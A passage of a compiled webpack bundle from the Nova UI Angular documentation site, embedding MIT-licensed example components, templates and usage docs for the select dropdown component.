SelectV2ErrorExampleComponent,\n        SelectV2InlineExampleComponent,\n        SelectV2DocsComponent,\n        SelectV2GroupedItemsExampleComponent,\n        SelectV2StylingExampleComponent,\n        SelectV2VirtualScrollExampleComponent,\n        SelectV2OverlayConfigExampleComponent,\n        SelectV2ReactiveFormFieldExampleComponent,\n        SelectV2CustomizeOptionsExampleComponent,\n        SelectV2CustomControlExampleComponent,\n        SelectV2TestExampleComponent,\n        SelectV2CustomContentExampleComponent,\n        SelectV2OptionsChangedExampleComponent,\n        SelectV2GettingValueExampleComponent,\n        SelectV2SettingValueExampleComponent,\n        SelectV2ColorPickerComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("select-v2"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class SelectV2Module {}\n'},63471:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./select-docs/select-docs.example.component";\nexport * from "./select-basic/select-basic.example.component";\nexport * from "./select-disabled/select-disabled.example.component";\nexport * from "./select-custom-template/select-custom-template.example.component";\nexport * from "./select-separators/select-separators.example.component";\nexport * from "./select-justified/select-justified.example.component";\nexport * from "./select-required/select-required.example.component";\nexport * from "./select-reactive-form/select-reactive-form.example.component";\nexport * from "./select-inline/select-inline.example.component";\nexport * from "./select-visual-test/select-visual-test.component";\nexport * from "./select-remove-value/select-remove-value.example.component";\n'},54813:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select\n    id="nui-demo-basic-select"\n    [itemsSource]="dataset.items"\n    i18n-placeholder\n    placeholder="Select item"\n></nui-select>\n'},1225:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-basic-example",\n    templateUrl: "./select-basic.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class SelectBasicExampleComponent {\n    public dataset = {\n        items: [\n            $localize`Item 1`,\n            $localize`Item 2`,\n            $localize`Item 3`,\n            $localize`Item 4`,\n            $localize`Item 5`,\n            $localize`Item 6`,\n            $localize`Item 7`,\n            $localize`Item 8`,\n            $localize`Item 9`,\n            $localize`Item 10`,\n            $localize`Item 11`,\n            $localize`Item 12`,\n            $localize`Item 13`,\n            $localize`Item 14`,\n            $localize`Item 15`,\n            $localize`Item 16`,\n            $localize`Item 17`,\n            $localize`Item 18`,\n            $localize`Item 19`,\n            $localize`Item 20`,\n        ],\n    };\n\n    constructor() {}\n}\n'},12981:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #customSelectTemplate let-item="context">\n    <nui-icon [icon]="item.icon"></nui-icon>\n    <div class="media-body" class="select-examples-custom-template">\n        <h2>{{ item.value }}</h2>\n        <h5>{{ item.name }}</h5>\n        <nui-progress\n            [showProgress]="true"\n            [show]="true"\n            [percent]="item.progress"\n        ></nui-progress>\n    </div>\n</ng-template>\n<nui-select\n    [value]="dataset.selectedItem"\n    id="nui-demo-select-with-template"\n    [itemsSource]="dataset.items"\n    [displayValue]="dataset.displayValue"\n    [customTemplate]="customSelectTemplate"\n></nui-select>\n'},489:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".select-examples {\n    &-custom-template {\n        min-width: 300px;\n    }\n}\n"},14577:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-custom-template-example",\n    templateUrl: "./select-custom-template.example.component.html",\n    styleUrls: ["./select-custom-template.example.component.less"],\n})\nexport class SelectCustomTemplateExampleComponent {\n    public dataset = {\n        displayValue: "value",\n        selectedItem: "",\n        items: [\n            {\n                name: "item_1",\n                value: "Bonobo",\n                icon: "severity_ok",\n                progress: 78,\n            },\n            {\n                name: "item_2",\n                value: "Zelda",\n                icon: "severity_ok",\n                progress: 66,\n            },\n            {\n                name: "item_3",\n                value: "Max",\n                icon: "severity_critical",\n                progress: 7,\n            },\n            {\n                name: "item_4",\n                value: "Apple",\n                icon: "severity_ok",\n                progress: 24,\n            },\n            {\n                name: "item_5",\n                value: "Quartz",\n                icon: "severity_warning",\n                progress: 89,\n            },\n        ],\n    };\n\n    constructor() {}\n}\n'},72053:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select\n    id="nui-demo-basic-select-disabled"\n    [itemsSource]="dataset.items"\n    [value]="dataset.selectedItem"\n    [isDisabled]="true"\n></nui-select>\n'},12689:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-disabled-example",\n    templateUrl: "./select-disabled.example.component.html",\n})\nexport class SelectDisabledExampleComponent {\n    public dataset = {\n        items: [\n            $localize`Item 1`,\n            $localize`Item 2`,\n            $localize`Item 3`,\n            $localize`Item 4`,\n            $localize`Item 5`,\n        ],\n        selectedItem: $localize`Item 1`,\n    };\n\n    constructor() {}\n}\n'},66365:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-select&gt;</code> allows user to select one item from a list.\n    <strong>Note:</strong> maximum width of select dropdown menu is 400px\n    (except for stretched select, where select itself and select dropdown menu\n    are justified to the width of container element).\n</p>\n\n<h2>Basic Usage</h2>\n<p>\n    To implement basic select you need to pass data via\n    <code>itemsSource</code> input. Use <code>placeholder</code> input to\n    display placeholder. <code>value</code> receives item that will be selected\n    before user starts to communicate with select component.\n    <code>itemsSource</code> data must be an array of strings.\n</p>\n<nui-example-wrapper filenamePrefix="select-basic" exampleTitle="Basic Usage">\n    <nui-select-basic-example></nui-select-basic-example>\n</nui-example-wrapper>\n\n<h2>Disabled</h2>\n<p>To disable select use <code>isDisabled</code> property.</p>\n<nui-example-wrapper filenamePrefix="select-disabled" exampleTitle="Disabled">\n    <nui-select-disabled-example></nui-select-disabled-example>\n</nui-example-wrapper>\n\n<h2>Required</h2>\n<p>\n    The option <code>isInErrorState</code> is used to set/change conditional\n    "required" validation. This is quick way to set select as required instead\n    of passing config object into validator. Use it to highlight error if field\n    is set to empty and you are not interested in specific message. To subscribe\n    to <code>changed</code> event you should pass a function, argument of which\n    is\n    <code\n        ><a href="../interfaces/ISelectChangedEvent.html" target="_blank"\n            >ISelectChangedEvent</a\n        ></code\n    >\n    object.\n</p>\n<nui-example-wrapper filenamePrefix="select-required" exampleTitle="Required">\n    <nui-select-required-example></nui-select-required-example>\n</nui-example-wrapper>\n\n<h2>Inline</h2>\n<p>\n    To make select inline you need to use <code>inline</code> property.\n    <strong>Note:</strong> As you see there are no spacings between\n    <code>nui-select</code>s in this example because spacings should be handled\n    by users themselves (users should use <code>@nui-space-md</code> spacing if\n    they want to have several selects next to each other).\n</p>\n<nui-example-wrapper filenamePrefix="select-inline" exampleTitle="Inline">\n    <nui-select-inline-example></nui-select-inline-example>\n</nui-example-wrapper>\n\n<h2>Separators</h2>\n<p>\n    If you want to have grouped data you need to pass data as an array of\n    <code\n        ><a href="../interfaces/ISelectGroup.html" target="_blank"\n            >ISelectGroup</a\n        ></code\n    >.\n</p>\n<nui-example-wrapper\n    filenamePrefix="select-separators"\n    exampleTitle="Select with separators"\n>\n    <nui-select-separators-example></nui-select-separators-example>\n</nui-example-wrapper>\n\n<h2>Filling the Parent Width</h2>\n<p>\n    For select to fill it\'s parent width you may pass <code>true</code> to the\n    <code>justified</code> property.\n</p>\n<nui-example-wrapper\n    filenamePrefix="select-justified"\n    exampleTitle="Filling the Parent Width"\n>\n    <nui-select-justified-example></nui-select-justified-example>\n</nui-example-wrapper>\n\n<h2>Using a Custom Template</h2>\n<p>\n    To provide custom template for every item in select you need to link\n    <code>customTemplate</code> input with <code>TemplateRef</code> that\n    represents custom template.\n</p>\n<nui-example-wrapper\n    filenamePrefix="select-custom-template"\n    exampleTitle="Select with custom template"\n>\n    <nui-select-custom-template-example></nui-select-custom-template-example>\n</nui-example-wrapper>\n\n<h2>Using With Reactive Forms</h2>\n<p>\n    To use <code>nui-select</code> in reactive forms you need to create\n    <code>FormGroup</code> that represents our form model. After that you can\n    bind <code>nui-select</code> to this form element using\n    <code>formControlName</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="select-reactive-form"\n    exampleTitle="Using With Reactive Forms"\n>\n    <nui-select-reactive-form></nui-select-reactive-form>\n</nui-example-wrapper>\n\n<h2>Select with a Possibility to Unselect Item</h2>\n<p>\n    To have a possibility to use unselect value\n    <code>isRemoveValueEnabled</code> input set to <code>true</code> should be\n    provided. This in turn will add an item to dropdown with\n    <code>Unspecified</code> label. To customize this label text, please use\n    <code>removeValueText</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="select-remove-value"\n    exampleTitle="Using With Default Value"\n>\n    <nui-select-remove-value></nui-select-remove-value>\n</nui-example-wrapper>\n'},55606:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-docs-example",\n    templateUrl: "./select-docs.example.component.html",\n})\nexport class SelectDocsComponent {}\n'},2813:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <span class="nui-text-default" i18n\n        >Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod\n        tempor.</span\n    >\n    <nui-select\n        id="nui-demo-inline-select"\n        [inline]="true"\n        [itemsSource]="dataset.itemsSource1"\n        i18n-placeholder\n        placeholder="Select item"\n    ></nui-select>\n    <nui-select\n        [itemsSource]="dataset.itemsSource2"\n        [inline]="true"\n        i18n-placeholder\n        placeholder="Select item"\n    ></nui-select>\n    <span class="nui-text-default" i18n\n        >Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi\n        ut aliquip ex ea commodo consequat.</span\n    >\n</p>\n'},92105:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-inline-example",\n    templateUrl: "select-inline.example.component.html",\n})\nexport class SelectInlineExampleComponent {\n    public dataset = {\n        itemsSource1: [\n            $localize`Item 1`,\n            $localize`Item 2`,\n            $localize`Item 3`,\n            $localize`Item 4`,\n            $localize`Item 5`,\n        ],\n        itemsSource2: [\n            $localize`Item 6`,\n            $localize`Item 7`,\n            $localize`Item 8`,\n            $localize`Item 9`,\n            $localize`Item 10`,\n        ],\n    };\n\n    constructor() {}\n}\n'},72327:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select\n    [value]="dataset.selectedItem"\n    id="nui-demo-select-justified"\n    [justified]="true"\n    [itemsSource]="dataset.items"\n></nui-select>\n'},89823:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-justified-example",\n    templateUrl: "./select-justified.example.component.html",\n})\nexport class SelectJustifiedExampleComponent {\n    public dataset = {\n        items: [\n            $localize`Item 1`,\n            $localize`Item 2`,\n            $localize`Item 3`,\n            $localize`Item 4`,\n            $localize`Item 5`,\n        ],\n        selectedItem: $localize`Item 1`,\n    };\n\n    constructor() {}\n}\n'},6401:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="myForm" (submit)="onSubmit()">\n    <div class="form-group">\n        <nui-select\n            placeholder="Select item"\n            id="nui-demo-basic-select-reactive-form"\n            formControlName="item"\n            [isInErrorState]="\n                myForm.controls[\'item\'].invalid &&\n                myForm.controls[\'item\'].touched\n            "\n            [itemsSource]="dataset.items"\n            (changed)="valueChange($event)"\n        ></nui-select>\n        <button nui-button type="submit" class="mt-1" i18n>Submit</button>\n    </div>\n</form>\n'},18605:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, OnInit } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\nimport { ISelectChangedEvent, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-reactive-form",\n    templateUrl: "./select-reactive-form.example.component.html",\n})\nexport class SelectReactiveFormExampleComponent implements OnInit {\n    public dataset = {\n        items: [\n            $localize`Item 1`,\n            $localize`Item 2`,\n            $localize`Item 3`,\n            $localize`Item 4`,\n            $localize`Item 5`,\n        ],\n        selectedItem: "",\n    };\n    public myForm;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        @Inject(ToastService) private toastService: ToastService\n    ) {\n        this.myForm = this.formBuilder.group({\n            item: this.formBuilder.control(this.dataset.selectedItem, [\n                Validators.required,\n            ]),\n        });\n    }\n\n    public ngOnInit(): void {\n        this.myForm.controls["item"].valueChanges.subscribe((value) =>\n            console.log("Value changed to", value)\n        );\n    }\n\n    public valueChange(changedEvent: ISelectChangedEvent<string>): void {\n        this.dataset.selectedItem = changedEvent.newValue;\n    }\n\n    public onSubmit(): void {\n        if (this.myForm.valid) {\n            this.toastService.success({\n                message: $localize`Your form is valid!`,\n            });\n        } else {\n            // if form is invalid mark all controls as touched to trigger isInErrorState\n            Object.keys(this.myForm.controls).forEach((field) => {\n                const control = this.myForm.get(field);\n                control?.markAsTouched({ onlySelf: true });\n            });\n            this.toastService.error({\n                message: $localize`Your form is invalid!`,\n            });\n        }\n    }\n}\n'},54765:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select\n    id="nui-demo-select-remove-value"\n    [itemsSource]="dataset.items"\n    i18n-removeValueText\n    i18n-placeholder\n    [isRemoveValueEnabled]="true"\n    removeValueText="None"\n    placeholder="Please select..."\n></nui-select>\n'},32569:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-remove-value",\n    templateUrl: "./select-remove-value.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class SelectRemoveValueExampleComponent {\n    public dataset = {\n        items: [\n            $localize`Item 1`,\n            $localize`Item 2`,\n            $localize`Item 3`,\n            $localize`Item 4`,\n            $localize`Item 5`,\n        ],\n    };\n\n    constructor() {}\n}\n'},92357:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select\n    id="nui-demo-basic-select-required"\n    [itemsSource]="dataset.items"\n    [isInErrorState]="isInErrorState()"\n    [value]="dataset.selectedItem"\n    (changed)="valueChange($event)"\n></nui-select>\n'},30753:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-required-example",\n    templateUrl: "./select-required.example.component.html",\n})\nexport class SelectRequiredExampleComponent {\n    public isRequired = true;\n    public dataset = {\n        items: [\n            $localize`Element 1`,\n            $localize`Element 2`,\n            $localize`Element 3`,\n            $localize`Element 4`,\n            $localize`Element 5`,\n            $localize`Element 6`,\n            $localize`Element 7`,\n            $localize`Element 8`,\n            $localize`Element 9`,\n            $localize`Element 10`,\n        ],\n        selectedItem: "",\n    };\n\n    constructor() {}\n\n    public valueChange(changedEvent: ISelectChangedEvent<string>): void {\n        this.dataset.selectedItem = changedEvent.newValue;\n    }\n\n    public isInErrorState(): boolean {\n        return this.isRequired && !this.dataset.selectedItem;\n    }\n}\n'},42061:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select\n    id="nui-demo-select-separators"\n    [itemsSource]="dataset.itemsInGroups"\n    [value]="dataset.selectedItem"\n    (changed)="valueChange($event)"\n></nui-select>\n'},93561:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { ISelectChangedEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-separators-example",\n    templateUrl: "./select-separators.example.component.html",\n})\nexport class SelectSeparatorsExampleComponent {\n    public dataset = {\n        itemsInGroups: [\n            {\n                header: $localize`Group 1 header`,\n                items: [\n                    $localize`Item 1`,\n                    $localize`Item 2`,\n                    $localize`Item 3`,\n                ],\n            },\n            {\n                header: $localize`Group 2 header`,\n                items: [\n                    $localize`Item 4`,\n                    $localize`Item 5`,\n                    $localize`Item 6`,\n                ],\n            },\n            {\n                header: $localize`Group 3 header`,\n                items: [\n                    $localize`Item 7`,\n                    $localize`Item 8`,\n                    $localize`Item 9`,\n                ],\n            },\n        ],\n        selectedItem: $localize`Item 1`,\n    };\n\n    constructor() {}\n\n    public valueChange(changedEvent: ISelectChangedEvent<string>): void {\n        this.dataset.selectedItem = changedEvent.newValue;\n    }\n}\n'},49815:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic Select</h3>\n            <nui-select\n                id="nui-demo-basic-select"\n                [itemsSource]="datasetBasic.items"\n                placeholder="Select item"\n            >\n            </nui-select>\n        </div>\n        <div class="col">\n            <h3>Disabled Select</h3>\n            <nui-select\n                id="nui-demo-basic-select-disabled"\n                [itemsSource]="datasetDisabled.items"\n                [value]="datasetDisabled.selectedItem"\n                [isDisabled]="true"\n            >\n            </nui-select>\n        </div>\n    </div>\n    <div class="row">\n        